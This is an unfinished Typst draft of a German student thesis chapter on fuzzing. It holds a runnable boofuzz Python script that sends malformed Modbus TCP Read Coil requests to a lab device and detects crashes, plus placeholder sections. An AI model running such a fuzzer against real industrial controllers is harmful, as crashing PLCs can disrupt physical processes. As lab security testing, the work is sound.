#import "@preview/htl3r-da:1.0.0" as htl3r
#htl3r.author("Marlene Reder")

== Fuzzing
=== Theoretische Grundlagen
#htl3r.info("WAS IST FUZZING")

=== Vorrausetztungen für den Angirff
Kali VM
Wireshark 
python
Terminal
zugang zum netzwerk

=== Script mit Credits
We funktioniert script / kommentare hinzufügen

```py
from boofuzz import *
import socket

HOST = "10.100.0.11"
PORT = 502
SLEEP = 0
RECV_TIMEOUT = 2

target = Target(connection=TCPSocketConnection(host=HOST, port=PORT))


def checkAliveAndRestart(target, fuzz_data_logger, session, sock, *args, **kwargs):
    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IS_CONNECTED = SOCKET.connect_ex((HOST, PORT))
    SOCKET.close()
    # Connection Lost
    if IS_CONNECTED != 0:
        fuzz_data_logger.log_error(description="Crash Detected: " + fuzz_data_logger.most_recent_test_id)
        import os
        os._exit(1)
        """
        May be restart process after crash ?
        """


SESSION = Session(target=target, post_test_case_callbacks=[checkAliveAndRestart],
                  restart_callbacks=[checkAliveAndRestart])


#Fuzz Read Coil function of Modbus Protocol
def FuzzReadCoilMemory():
    s_initialize("modbus_read_coil")
    s_word(0x0001, name='Transaction ID', fuzzable=True, endian=BIG_ENDIAN)
    s_word(0x0000, name='Protocol ID', fuzzable=False, endian=BIG_ENDIAN)
    s_word(0x0006, name='Length', fuzzable=True, endian=BIG_ENDIAN)
    s_byte(0x01, name='Unit Identifier', fuzzable=False, endian=BIG_ENDIAN)

    s_byte(0x01, name='Function Code for Read Coil Memory', fuzzable=False, endian=BIG_ENDIAN)
    s_word(0x0000, name='Start Address', fuzzable=True, endian=BIG_ENDIAN)
    s_word(0x0001, name='Amount of Coils to Read', fuzzable=True, endian=BIG_ENDIAN)

    SESSION.connect(s_get("modbus_read_coil"))
    SESSION.fuzz()


if __name__ == "__main__":
    FuzzReadCoilMemory()
```

=== Umsetztung - Fuzzing
erreichbarkeit testen von beiden geräten ???? \

```
befhele ausführen script
```

#figure(
  image("../assets/fuzzing/fuzzing-powershell.png"),
  caption: "Hallo"
)

#figure(
  image("../assets/fuzzing/fuzzing-web.png"),
  caption: "Hallo"
)


fuzzing analyste Wireshark \
bild Wireshark


=== Fazit ???

=== Quellen --> irgendwo anders hin???
